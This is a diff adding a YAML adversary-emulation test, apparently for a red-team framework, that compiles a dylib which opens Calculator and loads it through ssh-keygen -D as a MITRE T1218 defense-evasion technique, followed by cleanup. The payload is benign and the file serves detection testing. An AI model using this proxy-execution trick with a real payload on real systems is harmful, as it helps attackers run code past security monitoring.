@@ -1,0 +1,25 @@
+---
+name: ssh-keygen load dylib
+description: |
+  This TTP loads a custom dylib (which opens Calculator) via ssh-keygen.
+mitre:
+  tactics:
+    - T0005 Defense Evasion
+  techniques:
+    - T1218 System Binary Proxy Execution
+steps:
+  - name: setup
+    inline: |
+      echo "First building the source c file into a dylib..."
+      gcc -dynamiclib calc.c -o calc.dylib
+      echo "Calc dylib compiled!"
+  - name: load-dylib
+    inline: |
+      echo "Next, loading the compiled dylib via ssh-keygen..."
+      ssh-keygen -D `pwd`/calc.dylib
+      echo "TTP Done!"
+    cleanup:
+      inline: |
+        echo "Removing the compiled calc.dylib binary..."
+        rm calc.dylib
+        echo "Cleanup Finished!"
